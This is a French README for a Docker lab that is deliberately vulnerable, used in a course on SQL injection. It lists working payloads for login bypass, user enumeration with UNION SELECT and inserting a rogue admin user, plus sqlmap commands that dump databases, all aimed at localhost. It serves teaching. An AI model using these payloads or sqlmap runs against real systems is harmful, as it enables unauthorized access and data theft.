```
  ____   ___  _       ___        _           _   _             
 / ___| / _ \| |     |_ _|_ __  (_) ___  ___| |_(_) ___  _ __  
 \___ \| | | | |      | || '_ \ | |/ _ \/ __| __| |/ _ \| '_ \ 
  ___) | |_| | |___   | || | | || |  __/ (__| |_| | (_) | | | |
 |____/ \__\_\_____| |___|_| |_|/ |\___|\___|\__|_|\___/|_| |_|
                              |__/                             
```

![](readme_docs/287167c6.png)

Container Docker pour suivre le cours sur les Injections SQL

# Prérequis

* Docker
* Docker-compose
* Ports 8000, 8032, 8081 disponibles

# Lancement

Cloner le dépôt sur votre WSL

```bash
git clone git@github.com:LiliwoL/B3-Docker-Injection-SQL-Demonstration.git
```

Lancer le container

```bash
cd B3-Docker-Injection-SQL-Demonstration
bin/start
```

Accéder à la page web à l'adresse suivante:

http://127.0.0.8:8000


---

# Injections SQL possibles

## Authentification sans mot de passe

`' or 1=1 -- `

> Ne pas oublier l'espace à la fin
> https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/#ByPassingLoginScreens

## Enumération des utilisateurs

`' or 1=1 UNION SELECT * FROM users -- `

## Insertion d'un utilisateur dans la table users

`admin'; INSERT INTO users (password, username, id, email, admin) VALUES ('root', 'root', 7, 'hacker@fenelon.com', "true");`

# SQLMap

sqlmap -u http://127.0.0.1:8000 --forms --dbs

![](readme_docs/86043759.png)

sqlmap -u http://127.0.0.1:8000 --forms --tables -D db_name

![](readme_docs/8f6b0a65.png)

sqlmap -u http://127.0.0.1:8000 --forms --dump -D db_name -T table_name

![](readme_docs/3137fd85.png)

# Lancement

Clonez le dépôt

```bash
git clone 
```

Lancez le container

```bash
bin/start
```

Accédez au shell du container MySQL

```bash
bin/shell
```

![](readme_docs/d0107619.png)

Lancement du client mysql (saisissez le mot de passe **root**)

```bash
root@94416fbdf8e8:/# mysql -u root -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 7
Server version: 10.7.3-MariaDB-1:10.7.3+maria~focal mariadb.org binary distribution

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> 
```

